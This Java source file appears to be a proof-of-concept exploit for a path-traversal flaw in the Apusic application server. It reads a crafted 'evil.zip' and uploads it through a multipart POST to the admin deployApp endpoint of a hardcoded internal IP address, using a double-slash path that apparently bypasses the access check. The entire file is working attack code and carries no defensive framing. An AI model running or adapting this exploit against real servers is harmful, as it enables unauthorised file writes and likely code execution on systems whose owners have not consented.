package apusic;

import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;

import java.io.*;
import java.nio.charset.StandardCharsets;


public class deployApp_pathtraversal {

    public static void main(String[] args) throws IOException {

        FileInputStream fis = new FileInputStream("D:\\javaProjects\\VulDebug\\Kingdee\\src\\main\\resources\\evil.zip");
        byte[] bytes = new byte[fis.available()];
        fis.read(bytes);
        fis.close();

        String url = "http://10.58.120.201:6888/admin//protect/application/deployApp";
        HttpClientBuilder httpClientBuilder = HttpClientBuilder.create();

        HttpHost proxy = new HttpHost("127.0.0.1", 8080);
        RequestConfig config = RequestConfig.custom()
                .setProxy(proxy)
                .build();
        httpClientBuilder.setDefaultRequestConfig(config);
        HttpClient httpClient = httpClientBuilder.build();
        HttpPost httpPost = new HttpPost(url);
        /**
         * 路径穿越文件制作参考：https://blog.csdn.net/weixin_45527658/article/details/121282357
         */
        // TODO 修改文件路径
        File file = new File("D:\\javaProjects\\VulDebug\\Kingdee\\src\\main\\resources\\evil.zip");
        String fileName = file.getName();

        MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder.create()
                .addPart("appName",new StringBody("test",ContentType.TEXT_PLAIN))
                .addPart("deployInServer",new StringBody("false",ContentType.TEXT_PLAIN))
                .addBinaryBody("file",bytes,ContentType.create("application/x-zip-compressed"), fileName)
//                .addPart("file", new FileBody(file, ContentType.create("application/x-zip-compressed"), fileName))
                .addPart("archivePath",new StringBody("",ContentType.TEXT_PLAIN))
                .addPart("baseContext",new StringBody("",ContentType.TEXT_PLAIN))
                .addPart("startType",new StringBody("auto",ContentType.TEXT_PLAIN))
                .addPart("loadon",new StringBody("",ContentType.TEXT_PLAIN))
                .addPart("virtualHost",new StringBody("",ContentType.TEXT_PLAIN))
                .addPart("allowHosts",new StringBody("",ContentType.TEXT_PLAIN))
                .addPart("denyHosts",new StringBody("",ContentType.TEXT_PLAIN));
        HttpEntity multipartEntity = multipartEntityBuilder.build();
        httpPost.setEntity(multipartEntity);

        HttpResponse response = httpClient.execute(httpPost);
        int statusCode = response.getStatusLine().getStatusCode();
        HttpEntity responseEntity = response.getEntity();
        String responseBody = responseEntity != null ? EntityUtils.toString(responseEntity, StandardCharsets.UTF_8) : null;
        System.out.println(statusCode);

    }
}
